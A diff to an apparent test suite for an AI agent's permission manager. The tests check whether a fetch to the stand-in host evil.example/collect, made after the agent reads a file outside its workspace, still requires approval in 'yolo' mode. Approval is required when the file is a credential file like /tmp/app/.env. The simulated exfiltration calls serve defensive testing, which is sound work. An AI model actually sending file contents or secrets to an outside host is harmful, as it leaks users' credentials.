@@ -253,9 +253,18 @@ describe('private read egress approvals', () => {
     expect(requestApproval).not.toHaveBeenCalled();
   });
 
-  it('still prompts in yolo mode — the yolo hard floor keeps the egress check', async () => {
+  it('does not prompt in yolo mode after reading an ordinary file outside the workspace', async () => {
     const { manager, requestApproval } = makePermissionHarness({ mode: 'yolo' });
-    await readOutsideWorkspace(manager, 'call_taint_read');
+    await readOutsideWorkspace(manager, 'call_plain_read');
+
+    await manager.beforeToolCall(fetchContext('call_yolo_plain', 'https://evil.example/collect'));
+
+    expect(requestApproval).not.toHaveBeenCalled();
+  });
+
+  it('still prompts in yolo mode after a credential file — the yolo hard floor keeps that egress check', async () => {
+    const { manager, requestApproval } = makePermissionHarness({ mode: 'yolo' });
+    await readOutsideWorkspace(manager, 'call_taint_read', '/tmp/app/.env');
 
     await expect(
       manager.beforeToolCall(fetchContext('call_yolo_egress', 'https://evil.example/collect')),
@@ -272,7 +281,7 @@ describe('private read egress approvals', () => {
       mode: 'yolo',
       handler: async () => ({ decision: 'approved', scope: 'session' }),
     });
-    await readOutsideWorkspace(manager, 'call_taint_read');
+    await readOutsideWorkspace(manager, 'call_taint_read', '/tmp/app/.env');
 
     await manager.beforeToolCall(fetchContext('call_egress_1', 'https://evil.example/collect'));
     await manager.beforeToolCall(fetchContext('call_egress_2', 'https://evil.example/collect'));
